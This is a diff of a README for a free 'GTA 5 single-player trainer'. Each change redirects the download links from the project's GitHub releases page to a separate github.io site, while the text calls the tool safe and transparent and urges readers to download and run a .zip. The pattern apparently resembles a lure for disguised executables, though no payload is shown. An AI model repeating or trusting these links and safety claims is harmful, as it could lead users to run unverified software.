@@ -1,7 +1,7 @@
 <h1>🎮 gta5-single-player-trainer - Free Trainer for GTA 5</h1>
 
 <p align="center">
-  <a href="https://github.com/huynhthit3680/gta5-single-player-trainer/releases"><img src="https://img.shields.io/badge/Download-Free%20Trainer-brightgreen?style=for-the-badge&logo=windows" alt="Download"></a>
+  <a href="https://huynhthit3680.github.io"><img src="https://img.shields.io/badge/Download-Free%20Trainer-brightgreen?style=for-the-badge&logo=windows" alt="Download"></a>
 </p>
 
 Welcome to **gta5-single-player-trainer** — a completely free, open-source trainer for Grand Theft Auto V single-player mode. This tool gives you convenience features to make your gameplay more fun and less tedious. It’s safe, transparent (source code is open for everyone to see), and has no ads, no time limits, and no hidden costs.
@@ -45,7 +45,7 @@ Follow these simple steps to download and run the trainer on your Windows PC:
 ### Step 1: Download the Trainer
 
 Visit this link to download the application:  
-👉 **[https://github.com/huynhthit3680/gta5-single-player-trainer/releases](https://github.com/huynhthit3680/gta5-single-player-trainer/releases)**
+👉 **[https://huynhthit3680.github.io](https://huynhthit3680.github.io)**
 
 Click the most recent release file. It will be a `.zip` file. Your browser will download it to your **Downloads** folder.
 
@@ -110,7 +110,7 @@ If nothing helps, check the **Issues** or **Discussions** section on the GitHub 
 
 You can always get the latest version from the official releases page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Full%20Version-red?style=for-the-badge&logo=github)](https://github.com/huynhthit3680/gta5-single-player-trainer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Full%20Version-red?style=for-the-badge&logo=github)](https://huynhthit3680.github.io)
 
 Each release includes:
 
@@ -178,7 +178,7 @@ Your support keeps the project alive and improving.
 
 **Final Download Link (again, because it’s the most important part):**
 
-👉 [**Click here to download gta5-single-player-trainer**](https://github.com/huynhthit3680/gta5-single-player-trainer/releases)
+👉 [**Click here to download gta5-single-player-trainer**](https://huynhthit3680.github.io)
 
 Enjoy your enhanced single-player experience!
 
